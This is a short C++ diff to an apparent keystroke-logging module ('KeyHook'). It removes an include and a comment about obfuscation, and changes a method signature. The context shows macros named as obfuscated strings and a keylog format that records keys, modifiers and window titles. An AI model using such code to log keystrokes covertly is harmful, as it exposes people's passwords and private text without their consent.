@@ -7,11 +7,9 @@
 
 #include <string>
 #include <sstream>
-#include <vector>
 #include <cstdint>
 #include <map>
 
-// Obfuscated strings - use proper obfuscation technique
 #define OBF_KEYHOOK_MODULE "KeyHook"
 #define OBFUSCATED_KEYLOG_FORMAT "KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }"
 
@@ -209,7 +207,7 @@ std::string KeyHook::PlatformKeyCodeToString(UINT vkCode) const {
 }
 #endif
 
-void KeyHook::LogKeyEvent(const KeyData& keyData) const {
+void KeyHook::LogKeyEvent(const KeyData& keyData) {
     std::string action = (keyData.eventType == KeyEventType::KEY_DOWN) ? "DOWN" : "UP";
     
     std::string modifiers;
